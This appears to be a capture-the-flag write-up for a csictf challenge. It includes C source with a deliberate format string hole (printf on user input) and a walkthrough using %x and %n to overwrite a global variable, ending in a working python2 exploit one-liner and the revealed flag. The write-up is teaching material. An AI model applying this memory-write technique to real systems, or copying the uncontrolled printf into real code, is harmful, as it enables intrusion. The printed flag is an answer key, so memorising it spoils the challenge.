# Global Warming

Author: [AJ1479](https://github.com/AJ1479)

## Description

String format exploit to overwrite global variable.

## Requirements

- Basic Knowledge of format string exploit.
- Docker: [Dockerfile](./Dockerfile)

## Sources

- [global-warming](./bin/global-warming): Binary

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int admin = 0;

void login(char username[10], char *pass)
{

	printf(pass);
	if (admin != 0)
	{
		system("cat flag.txt");
	}
	else
	{
		printf("You cannot login as admin.");
	}
}

int main()
{
	setbuf(stdout, NULL);
	setbuf(stdin, NULL);
	setbuf(stderr, NULL);

	char pass[1024];
	fgets(pass, sizeof(pass), stdin);

	login("User", pass);
}
```

```
Greta Thunberg 1 Administration 0
```

## Exploit

The program has a global variable `admin`, the value of which needs to be changed. Looking at the program we see a printf statement, printing our input in `fgets`. Here, we need to use the string format exploit. We use `%x` as the format string input which returns values from the stack. We're also going to use the `%n` which writes the number of characters before the `%n` to the address just above(before) it in the stack. Also, memory addresses of global variables are stored in can be easily read from the `objdump` of the binary.
<br />

Steps to solve the challenge:
1) Find out the memory address of `admin` using the command `objdump -t <binary of file>` this is where we need to write a non-zero value.
2) Input a bunch of `%x`s to the program that will print values off of the stack.
3) If you print enough number of `%x `s (It's a good idea to put a space after the `%x` to make printed values more readable), you get a recurring pattern (something like 25207825 78252078) and you realise you're seeing the `%x`s (something you can probably figure out by the `20`s which stand for blank spaces).\
4) What you need to do is to ensure that the last byte you print is the memory address of `admin` as you want to modify the value stored there. You do this by using recognizable characters and some trial and error; changing the number of `%x `s
5) When you reach this point you can replace the last `%x ` with `%n ` which should overwrite the value of `admin` with some number (the number of characters printed before it) and give you the flag.
<br />

```bash
$ python2 -c "print '\x2c\xc0\x04\x08' + '%x '*11 + '%n '" | ./global-warming
,f7fe8a34 fbad2087 80491b2 f7f9de24 804c000 ffffd038 8049294 804a030 ffffcc30 f7f9e540 8049216  
csictf{n0_5tr1ng5_@tt@ch3d}
```

The flag is:

```
csictf{n0_5tr1ng5_@tt@ch3d}
```